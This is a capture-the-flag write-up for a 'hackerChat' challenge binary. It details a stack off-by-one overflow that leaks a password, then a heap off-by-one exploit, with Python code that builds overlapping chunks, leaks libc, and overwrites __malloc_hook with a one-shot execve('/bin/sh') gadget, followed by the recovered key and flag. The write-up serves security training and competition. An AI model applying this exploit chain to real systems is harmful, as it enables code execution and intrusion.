HackerChat Writeup 
===
###### Target:
> 6062bdab4760f2026afb1245d43fea6b  hackerChat
> cbdbf6e2bea8d490dee24fff5140729e  libc.so.6

###### See [exploit.py](https://github.sec.samsung.net/SCTF/challenges/blob/master/Attack/HackersChat/exploit.py)

###### Exploitation:
1. Password leak

Supply 32 bytes into `username` stack variable to cause Off-By-One overflow.
Last termination byte `\0` writes to the first byte of `password_from_file` variable, 
which later will be filled from file `cred_file.psw` thus making string concatenation and leakage. 

```C
__int64 __fastcall auth(int fd) {
    char password[32];              // [rbp-A0h]
    char username_from_file[32];    // [rbp-80h]
    char username[32];              // [rbp-60h]
    char password_from_file[32];    // [rbp-40h]
    unsigned int result;            // [rbp-14h]
    char *s;                        // [rbp-10h]
    int n;                          // [rbp-4h]
    ...
    n = read(fd, username, 32uLL);
    s = strchr(username, '\n');
    if ( s ) *s = 0;
    else username[n] = 0;           // <-- Overflow
    ...
    result = authenticate(username, password, username_from_file, password_from_file);
    if ( !result ) {
        ...
        snprintf(buf, 0x64uLL, "Error Login as: %s\n", username);   // <-- Leakage
        ...
    }
    return result;
}
```

2. Heap Off-By-One Exploitation
    1. Prepare overlapping heap chunks 
    
        ```python
            send_msg('A' * 0xf8)
            send_msg('B' * 0x68)
            send_msg('C' * 0xf8)
            send_msg('D' * 0x10)
        
            delete_msg(0)
            delete_msg(0)
        
            send_msg('E' * 0x68)
            for i in xrange(0x66, 0x5f, -1):
                delete_msg(2)
                send_msg('F' * i + '\x70\x01')
        
            delete_msg(0)
            send_msg('G' * 0xf7)
        ```
        Now chunk _B_ (message index 1) considered as a free.
        
    2. Leak libc address
        
        ```python
            output = read_msg()
            libc_leak = re.split("Message \\d: ", output)[2]

            libc_offset = 0x19eb20 + 88  # = main_arena - libc_base - bin_offset
            libc_leak = unpack(libc_leak + (8-len(libc_leak))*'\x00', 64)
            libc_base = libc_leak - libc_offset
        ```
    3. Find one-shoot gadget in `libc.so.6`
    
        `0x408c2: execve("/bin/sh", rsp + 0x30, environ)`  
        
    4. Write gadget to `__malloc_hook`
    
        ```python
            send_msg('I' * 0x100 + pack(malloc_hook - 0x23, 64))
            
            for i in xrange(0xfe, 0xf7, -1):
                delete_msg(1)
                send_msg('J' * i + '\x70')
            
            send_msg('K' * 0x68)
            send_msg('A' * 0x13 + pack(value, 64) + 'D' * 0x4d)
        ```
        
    5. Trigger gadget execution by invoking `malloc()` and read `k@q.k` file:
    
        `[+] Key: qwd918szq2dwqa9ngref833bfjtjxcve`
        
    6. Decrypt messages
        Run again:
        <pre>
        [+] Key: qwd918szq2dwqa9ngref833bfjtjxcve
        [+] login(admin:superPassword)
        [*] read_msg()
        [+] Flag: <b>flag{Y0u_4r3_h34p_k1ng!!!!!!!}</b></pre>

    4. PROFIT!
